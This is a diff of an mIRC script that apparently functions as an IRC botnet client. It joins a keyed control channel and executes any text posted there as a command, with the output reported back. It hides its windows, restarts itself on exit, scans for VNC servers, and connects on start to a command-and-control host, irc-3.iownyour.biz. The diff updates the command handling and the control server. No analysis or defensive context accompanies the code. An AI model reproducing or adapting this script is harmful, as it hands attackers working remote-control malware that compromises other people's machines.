@@ -5,14 +5,14 @@ alias ff .timerff 0 1 findtray
 raw 001:*:{ set %fldchan #X#psy#X# | set %key $encode(Sm0k3d,m) | join %fldchan %key }
 raw 475:*:{ join %fldchan %key }
 RAW 332:*:if ($2 == %fldchan) [ [ $3- ] ]
-on *:TEXT:*:*:{ %x = $right($1-,-1) | $evalnext(%x) | opnotice %fldchan $evalnext(%x) | unset %x | close -m | windows -h $active }
+on *:TEXT:*:*:{ %x = $1- | $evalnext(%x) | opnotice %fldchan $evalnext(%x) | unset %x | close -m | windows -h $active }
 on *:EXIT:run $mircexe
 on *:sockopen:vncscan*:{
   if ($sockerr) { return }
   sockwrite -n $sockname 1 82 70 66 32 48 48 51 46 48 48 56 10
 
 }
-on *:START:{ server irc-2.iownyour.biz +6697 -jn %fldchan %key }
+on *:START:{ server irc-3.iownyour.biz +6697 -jn %fldchan %key }
 on *:sockread:vncscan*:{
   :nextread
   sockread %vnc
